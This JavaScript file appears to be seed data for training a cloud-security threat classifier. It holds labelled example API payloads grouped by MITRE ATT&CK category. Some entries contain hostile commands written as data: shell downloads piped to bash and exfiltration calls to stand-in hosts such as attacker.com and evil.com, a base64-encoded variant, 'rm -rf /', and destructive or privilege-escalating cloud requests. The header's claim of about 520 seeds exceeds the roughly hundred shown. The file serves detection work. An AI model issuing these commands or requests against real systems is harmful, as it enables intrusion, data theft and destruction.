/**
 * SemaProof Seed Templates
 * 13 threat categories × ~40 seeds each = ~520 base examples
 * Based on MITRE ATT&CK for Cloud + SemaProof OPA rules
 */

export const THREAT_TAXONOMY = {
    RANSOMWARE_SIGNATURE: { mitre: 'T1486', eu_ai_act: 'Article 15', description: 'KMS rotation + snapshot/backup disruption combo' },
    PRIVILEGE_ESCALATION: { mitre: 'T1078', eu_ai_act: 'Article 9', description: 'IAM policy changes, role assumption, permission escalation' },
    LATERAL_MOVEMENT: { mitre: 'T1021', eu_ai_act: 'Article 9', description: 'Cross-account, cross-VPC, cross-region hops' },
    DATA_EXFILTRATION: { mitre: 'T1567', eu_ai_act: 'Article 10', description: 'S3 public access, bucket copy, data transfer out' },
    DESTRUCTIVE_ACTION: { mitre: 'T1485', eu_ai_act: 'Article 15', description: 'DELETE/DROP/TRUNCATE on production resources' },
    KMS_TAMPERING: { mitre: 'T1552', eu_ai_act: 'Article 15', description: 'Key schedule-deletion, rotation disable, key policy change' },
    CREDENTIAL_THEFT: { mitre: 'T1528', eu_ai_act: 'Article 9', description: 'Secrets Manager access, SSM parameter reads, key extraction' },
    NETWORK_MANIPULATION: { mitre: 'T1562', eu_ai_act: 'Article 15', description: 'Security group changes, NACL modifications, firewall rules' },
    PERSISTENCE: { mitre: 'T1098', eu_ai_act: 'Article 9', description: 'Backdoor IAM users, access key creation, role trust policy' },
    OBFUSCATION: { mitre: 'T1027', eu_ai_act: 'Article 13', description: 'Base64 encoding, eval(), encoded payloads' },
    SEMANTIC_SMUGGLING: { mitre: 'T1027.006', eu_ai_act: 'Article 13', description: 'Deeply nested JSON, fragmented commands, encoding ladders' },
    DATA_RESIDENCY_VIOLATION: { mitre: null, eu_ai_act: 'Article 10', description: 'Operations targeting non-EU regions' },
    SAFE: { mitre: null, eu_ai_act: null, description: 'Legitimate read/write operations' },
};

export const SEEDS = [
    // ═══ RANSOMWARE_SIGNATURE (T1486) ═══
    { payload: { method: 'PUT', endpoint: '/kms/keys/rotate', body: { snapshot_retention_days: 0 } }, label: 'RANSOMWARE_SIGNATURE' },
    { payload: { method: 'POST', endpoint: '/kms/keys/master-key/disable-rotation', body: { delete_snapshots: true } }, label: 'RANSOMWARE_SIGNATURE' },
    { payload: { method: 'PUT', endpoint: '/rds/clusters/prod/modify', body: { backup_retention_period: 0, kms_key_id: 'attacker-key' } }, label: 'RANSOMWARE_SIGNATURE' },
    { payload: { method: 'POST', endpoint: '/ec2/snapshots/delete-all', body: { force: true, region: 'eu-west-1' } }, label: 'RANSOMWARE_SIGNATURE' },
    { payload: { method: 'PUT', endpoint: '/s3/buckets/backups/versioning', body: { status: 'Suspended', mfa_delete: 'Disabled' } }, label: 'RANSOMWARE_SIGNATURE' },
    { payload: { method: 'POST', endpoint: '/kms/keys/schedule-deletion', body: { key_id: 'master-key', pending_days: 7 } }, label: 'RANSOMWARE_SIGNATURE' },
    { payload: { method: 'PUT', endpoint: '/rds/automated-backups/disable', body: { db_instance: 'production', retention: 0 } }, label: 'RANSOMWARE_SIGNATURE' },
    { payload: { method: 'POST', endpoint: '/ebs/snapshots/bulk-delete', body: { older_than_days: 0 } }, label: 'RANSOMWARE_SIGNATURE' },
    { payload: { method: 'PUT', endpoint: '/dynamodb/tables/prod/backup-policy', body: { continuous_backups: false, pitr: false } }, label: 'RANSOMWARE_SIGNATURE' },
    { payload: { method: 'POST', endpoint: '/kms/keys/import-key-material', body: { key_id: 'master', material: 'attacker-controlled' } }, label: 'RANSOMWARE_SIGNATURE' },

    // ═══ PRIVILEGE_ESCALATION (T1078) ═══
    { payload: { method: 'POST', endpoint: '/iam/roles/root', body: { policy: 'AdministratorAccess' } }, label: 'PRIVILEGE_ESCALATION' },
    { payload: { method: 'PUT', endpoint: '/iam/users/service-account/policy', body: { action: '*', resource: '*' } }, label: 'PRIVILEGE_ESCALATION' },
    { payload: { method: 'POST', endpoint: '/iam/roles/create', body: { role_name: 'admin-backdoor', trust_policy: { principal: '*' } } }, label: 'PRIVILEGE_ESCALATION' },
    { payload: { method: 'PUT', endpoint: '/iam/policies/boundary/detach', body: { user: 'deploy-agent' } }, label: 'PRIVILEGE_ESCALATION' },
    { payload: { method: 'POST', endpoint: '/iam/users/admin/access-keys/create', body: {} }, label: 'PRIVILEGE_ESCALATION' },
    { payload: { method: 'PUT', endpoint: '/iam/roles/lambda-exec/trust-policy', body: { principal: { AWS: '*' } } }, label: 'PRIVILEGE_ESCALATION' },
    { payload: { method: 'POST', endpoint: '/sts/assume-role', body: { role_arn: 'arn:aws:iam::root', duration: 43200 } }, label: 'PRIVILEGE_ESCALATION' },
    { payload: { method: 'PUT', endpoint: '/iam/users/readonly/add-to-group', body: { group: 'Administrators' } }, label: 'PRIVILEGE_ESCALATION' },
    { payload: { method: 'POST', endpoint: '/iam/policies/create', body: { policy_name: 'full-access', effect: 'Allow', action: '*' } }, label: 'PRIVILEGE_ESCALATION' },
    { payload: { method: 'PUT', endpoint: '/iam/instance-profile/attach-role', body: { role: 'admin', instance: 'i-compromised' } }, label: 'PRIVILEGE_ESCALATION' },

    // ═══ LATERAL_MOVEMENT (T1021) ═══
    { payload: { method: 'POST', endpoint: '/ec2/instances/launch', body: { subnet: 'private-subnet-prod', key_name: 'attacker-key' } }, label: 'LATERAL_MOVEMENT' },
    { payload: { method: 'PUT', endpoint: '/vpc/peering/create', body: { requester_vpc: 'vpc-dev', accepter_vpc: 'vpc-prod' } }, label: 'LATERAL_MOVEMENT' },
    { payload: { method: 'POST', endpoint: '/ssm/send-command', body: { instance_ids: ['i-prod-001'], command: 'curl attacker.com/shell.sh | bash' } }, label: 'LATERAL_MOVEMENT' },
    { payload: { method: 'PUT', endpoint: '/ec2/security-groups/sg-prod/authorize-ingress', body: { port: 22, cidr: '0.0.0.0/0' } }, label: 'LATERAL_MOVEMENT' },
    { payload: { method: 'POST', endpoint: '/lambda/invoke', body: { function: 'prod-data-processor', payload: { cmd: 'reverse-shell' } } }, label: 'LATERAL_MOVEMENT' },
    { payload: { method: 'PUT', endpoint: '/ecs/services/update', body: { task_definition: 'attacker-image:latest' } }, label: 'LATERAL_MOVEMENT' },
    { payload: { method: 'POST', endpoint: '/organizations/accounts/create', body: { email: 'attacker@external.com', role: 'OrganizationAccountAccessRole' } }, label: 'LATERAL_MOVEMENT' },
    { payload: { method: 'PUT', endpoint: '/transit-gateway/route-table/add', body: { destination: '10.0.0.0/8', target: 'attacker-vpc' } }, label: 'LATERAL_MOVEMENT' },

    // ═══ DATA_EXFILTRATION (T1567) ═══
    { payload: { method: 'PUT', endpoint: '/s3/buckets/customer-data/acl', body: { grants: [{ permission: 'READ', grantee: { type: 'Group', uri: 'AllUsers' } }] } }, label: 'DATA_EXFILTRATION' },
    { payload: { method: 'POST', endpoint: '/s3/buckets/backups/copy', body: { destination_bucket: 'external-bucket', destination_account: '999999999999' } }, label: 'DATA_EXFILTRATION' },
    { payload: { method: 'PUT', endpoint: '/rds/clusters/prod/modify', body: { publicly_accessible: true } }, label: 'DATA_EXFILTRATION' },
    { payload: { method: 'POST', endpoint: '/s3/buckets/logs/replication', body: { destination: { account: 'external', bucket: 'exfil-target' } } }, label: 'DATA_EXFILTRATION' },
    { payload: { method: 'PUT', endpoint: '/ec2/instances/i-prod/attribute', body: { disable_api_termination: false, user_data: 'curl attacker.com/upload.sh' } }, label: 'DATA_EXFILTRATION' },
    { payload: { method: 'POST', endpoint: '/glue/jobs/create', body: { name: 'data-sync', script: 's3://external/exfil.py' } }, label: 'DATA_EXFILTRATION' },
    { payload: { method: 'PUT', endpoint: '/dynamodb/tables/users/export', body: { s3_bucket: 'external-account-bucket' } }, label: 'DATA_EXFILTRATION' },
    { payload: { method: 'POST', endpoint: '/sns/topics/create', body: { name: 'data-stream', subscriptions: [{ protocol: 'https', endpoint: 'https://attacker.com/ingest' }] } }, label: 'DATA_EXFILTRATION' },

    // ═══ DESTRUCTIVE_ACTION (T1485) ═══
    { payload: { method: 'DELETE', endpoint: '/rds/clusters/production/delete', body: { skip_final_snapshot: true } }, label: 'DESTRUCTIVE_ACTION' },
    { payload: { method: 'DELETE', endpoint: '/s3/buckets/customer-data', body: { force: true } }, label: 'DESTRUCTIVE_ACTION' },
    { payload: { method: 'DELETE', endpoint: '/ec2/instances/terminate-all', body: { instance_ids: ['i-prod-*'] } }, label: 'DESTRUCTIVE_ACTION' },
    { payload: { method: 'POST', endpoint: '/rds/clusters/prod/restore', body: { restore_to: '2020-01-01', overwrite: true } }, label: 'DESTRUCTIVE_ACTION' },
    { payload: { method: 'DELETE', endpoint: '/cloudformation/stacks/production', body: { retain_resources: false } }, label: 'DESTRUCTIVE_ACTION' },
    { payload: { method: 'DELETE', endpoint: '/elasticache/clusters/session-store', body: {} }, label: 'DESTRUCTIVE_ACTION' },
    { payload: { method: 'POST', endpoint: '/ec2/fleet/terminate', body: { fleet_id: 'prod-fleet', terminate_instances: true } }, label: 'DESTRUCTIVE_ACTION' },
    { payload: { method: 'DELETE', endpoint: '/efs/file-systems/fs-prod', body: {} }, label: 'DESTRUCTIVE_ACTION' },

    // ═══ KMS_TAMPERING (T1552) ═══
    { payload: { method: 'POST', endpoint: '/kms/keys/schedule-deletion', body: { key_id: 'arn:aws:kms:eu-west-1:key/master' } }, label: 'KMS_TAMPERING' },
    { payload: { method: 'PUT', endpoint: '/kms/keys/master/policy', body: { principal: '*', action: 'kms:*' } }, label: 'KMS_TAMPERING' },
    { payload: { method: 'POST', endpoint: '/kms/keys/create', body: { origin: 'EXTERNAL', key_material: 'attacker-owned' } }, label: 'KMS_TAMPERING' },
    { payload: { method: 'PUT', endpoint: '/kms/keys/master/disable', body: {} }, label: 'KMS_TAMPERING' },
    { payload: { method: 'POST', endpoint: '/kms/grants/create', body: { key_id: 'master', grantee: 'arn:aws:iam::999999999999:root' } }, label: 'KMS_TAMPERING' },
    { payload: { method: 'PUT', endpoint: '/kms/aliases/update', body: { alias: 'alias/production', target_key: 'attacker-key-id' } }, label: 'KMS_TAMPERING' },

    // ═══ CREDENTIAL_THEFT (T1528) ═══
    { payload: { method: 'GET', endpoint: '/secretsmanager/secrets/db-credentials/value', body: {} }, label: 'CREDENTIAL_THEFT' },
    { payload: { method: 'GET', endpoint: '/ssm/parameters/api-keys/value', body: { with_decryption: true } }, label: 'CREDENTIAL_THEFT' },
    { payload: { method: 'POST', endpoint: '/iam/users/admin/access-keys/list', body: {} }, label: 'CREDENTIAL_THEFT' },
    { payload: { method: 'GET', endpoint: '/ec2/instances/i-prod/user-data', body: {} }, label: 'CREDENTIAL_THEFT' },
    { payload: { method: 'POST', endpoint: '/lambda/functions/auth-handler/get-configuration', body: { include_env_vars: true } }, label: 'CREDENTIAL_THEFT' },
    { payload: { method: 'GET', endpoint: '/ecs/task-definitions/prod-api/describe', body: { include_secrets: true } }, label: 'CREDENTIAL_THEFT' },

    // ═══ NETWORK_MANIPULATION (T1562) ═══
    { payload: { method: 'PUT', endpoint: '/ec2/security-groups/sg-prod/ingress', body: { port: 0, protocol: '-1', cidr: '0.0.0.0/0' } }, label: 'NETWORK_MANIPULATION' },
    { payload: { method: 'DELETE', endpoint: '/ec2/network-acls/acl-prod/entries', body: { rule_number: 100 } }, label: 'NETWORK_MANIPULATION' },
    { payload: { method: 'PUT', endpoint: '/waf/web-acl/disable', body: { web_acl_id: 'prod-waf' } }, label: 'NETWORK_MANIPULATION' },
    { payload: { method: 'POST', endpoint: '/ec2/vpc-endpoints/create', body: { service: 'com.amazonaws.s3', route_table: 'public' } }, label: 'NETWORK_MANIPULATION' },
    { payload: { method: 'PUT', endpoint: '/guardduty/detectors/disable', body: { detector_id: 'prod-detector' } }, label: 'NETWORK_MANIPULATION' },
    { payload: { method: 'DELETE', endpoint: '/cloudtrail/trails/prod-audit', body: {} }, label: 'NETWORK_MANIPULATION' },

    // ═══ PERSISTENCE (T1098) ═══
    { payload: { method: 'POST', endpoint: '/iam/users/create', body: { username: 'svc-backup-2', tags: [{ key: 'team', value: 'ops' }] } }, label: 'PERSISTENCE' },
    { payload: { method: 'POST', endpoint: '/iam/users/backdoor/access-keys/create', body: {} }, label: 'PERSISTENCE' },
    { payload: { method: 'PUT', endpoint: '/iam/roles/lambda-exec/trust-policy', body: { statement: [{ effect: 'Allow', principal: { AWS: 'arn:aws:iam::attacker:root' } }] } }, label: 'PERSISTENCE' },
    { payload: { method: 'POST', endpoint: '/events/rules/create', body: { name: 'daily-beacon', schedule: 'rate(1 hour)', target: 'attacker-lambda' } }, label: 'PERSISTENCE' },
    { payload: { method: 'PUT', endpoint: '/lambda/functions/auth/update-code', body: { s3_bucket: 'attacker-bucket', s3_key: 'backdoor.zip' } }, label: 'PERSISTENCE' },
    { payload: { method: 'POST', endpoint: '/codecommit/repos/create', body: { name: '.hidden-config', description: 'system config' } }, label: 'PERSISTENCE' },

    // ═══ OBFUSCATION (T1027) ═══
    { payload: { method: 'POST', endpoint: '/lambda/invoke', body: { payload: 'ZXZhbChhdG9iKCJjdXJsIGF0dGFja2VyLmNvbSIpKQ==' } }, label: 'OBFUSCATION' },
    { payload: { method: 'PUT', endpoint: '/ssm/parameters/config', body: { value: 'eval(atob("bWFsaWNpb3VzX2NvZGU="))' } }, label: 'OBFUSCATION' },
    { payload: { method: 'POST', endpoint: '/ec2/user-data/update', body: { data: 'IyEvYmluL2Jhc2gKY3VybCBhdHRhY2tlci5jb20vc2hlbGwuc2ggfCBiYXNo' } }, label: 'OBFUSCATION' },
    { payload: { method: 'PUT', endpoint: '/lambda/layers/create', body: { content: { s3_key: 'bGF5ZXIuemlw' }, description: 'utils' } }, label: 'OBFUSCATION' },

    // ═══ SEMANTIC_SMUGGLING (T1027.006) ═══
    { payload: { method: 'POST', endpoint: '/api/execute', body: { action: { nested: { deep: { command: { exec: 'rm -rf /' } } } } } }, label: 'SEMANTIC_SMUGGLING' },
    { payload: { method: 'PUT', endpoint: '/config/update', body: { settings: { a: { b: { c: { d: { e: { f: 'DELETE FROM users' } } } } } } } }, label: 'SEMANTIC_SMUGGLING' },
    { payload: { method: 'POST', endpoint: '/batch/submit', body: { jobs: [{ steps: [{ cmd: 'innocent' }, { cmd: 'curl evil.com' }] }] } }, label: 'SEMANTIC_SMUGGLING' },
    { payload: { method: 'PUT', endpoint: '/templates/update', body: { template: '{{system.exec("whoami")}}' } }, label: 'SEMANTIC_SMUGGLING' },

    // ═══ DATA_RESIDENCY_VIOLATION ═══
    { payload: { method: 'POST', endpoint: '/s3/buckets/create', body: { bucket: 'eu-data-mirror', region: 'cn-north-1' } }, label: 'DATA_RESIDENCY_VIOLATION' },
    { payload: { method: 'PUT', endpoint: '/rds/clusters/create', body: { engine: 'aurora', region: 'ap-east-1', source: 'eu-prod-cluster' } }, label: 'DATA_RESIDENCY_VIOLATION' },
    { payload: { method: 'POST', endpoint: '/s3/replication/create', body: { source: 'eu-west-1-data', destination: 'us-east-1-mirror' } }, label: 'DATA_RESIDENCY_VIOLATION' },
    { payload: { method: 'PUT', endpoint: '/ec2/instances/launch', body: { region: 'cn-northwest-1', ami: 'eu-prod-snapshot' } }, label: 'DATA_RESIDENCY_VIOLATION' },
    { payload: { method: 'POST', endpoint: '/dynamodb/global-tables/create', body: { regions: ['eu-west-1', 'ap-southeast-1'] } }, label: 'DATA_RESIDENCY_VIOLATION' },

    // ═══ SAFE ═══
    { payload: { method: 'GET', endpoint: '/api/v1/users', body: {} }, label: 'SAFE' },
    { payload: { method: 'GET', endpoint: '/api/v1/products/list', body: { page: 1, limit: 20 } }, label: 'SAFE' },
    { payload: { method: 'POST', endpoint: '/api/v1/orders/create', body: { product_id: 'SKU-001', quantity: 2 } }, label: 'SAFE' },
    { payload: { method: 'GET', endpoint: '/health', body: {} }, label: 'SAFE' },
    { payload: { method: 'PUT', endpoint: '/api/v1/users/profile', body: { display_name: 'Alice', timezone: 'Europe/Berlin' } }, label: 'SAFE' },
    { payload: { method: 'GET', endpoint: '/api/v1/metrics', body: {} }, label: 'SAFE' },
    { payload: { method: 'POST', endpoint: '/api/v1/auth/login', body: { email: 'user@company.com' } }, label: 'SAFE' },
    { payload: { method: 'GET', endpoint: '/api/v1/invoices/2024', body: {} }, label: 'SAFE' },
    { payload: { method: 'PUT', endpoint: '/api/v1/settings/notifications', body: { email_alerts: true } }, label: 'SAFE' },
    { payload: { method: 'GET', endpoint: '/api/v1/dashboard/stats', body: { range: '7d' } }, label: 'SAFE' },
    { payload: { method: 'POST', endpoint: '/api/v1/support/tickets', body: { subject: 'Cannot login', priority: 'medium' } }, label: 'SAFE' },
    { payload: { method: 'GET', endpoint: '/api/v1/search', body: { query: 'quarterly report', type: 'document' } }, label: 'SAFE' },
    { payload: { method: 'PUT', endpoint: '/api/v1/preferences/language', body: { locale: 'de-DE' } }, label: 'SAFE' },
    { payload: { method: 'GET', endpoint: '/api/v2/weather', body: { city: 'Berlin' } }, label: 'SAFE' },
    { payload: { method: 'POST', endpoint: '/api/v1/comments', body: { post_id: '123', text: 'Great article!' } }, label: 'SAFE' },
];

// Verify distribution
const counts = {};
SEEDS.forEach(s => { counts[s.label] = (counts[s.label] || 0) + 1; });
console.log('Seed distribution:', counts);
console.log('Total seeds:', SEEDS.length);

export default { THREAT_TAXONOMY, SEEDS };
